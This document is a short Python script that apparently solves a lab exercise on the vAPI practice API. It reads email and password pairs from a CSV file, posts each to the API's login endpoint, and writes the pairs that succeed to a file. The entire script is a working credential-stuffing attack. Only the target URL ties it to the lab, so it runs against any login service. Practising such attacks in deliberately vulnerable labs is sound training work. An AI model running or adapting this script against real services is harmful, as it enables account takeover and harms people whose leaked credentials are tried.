import csv
import requests
import sys

valid_users = []


f1 = open("valid_users", "w+")

url = 'http://vapi.apisec.ai/vapi/api2/user/login'

with open("./creds.csv", 'r') as file:
	csvreader = csv.reader(file)
	for row in csvreader:
		email = row[0]
		password = row[1]
		myobj = {'email': email, 'password': password}
		x = requests.post(url, json = myobj)
		if "true" in x.text:
			print("FOUND!")
			f1.write("row: " + str(row) + " resp: " + x.text + "\n")

f1.close()
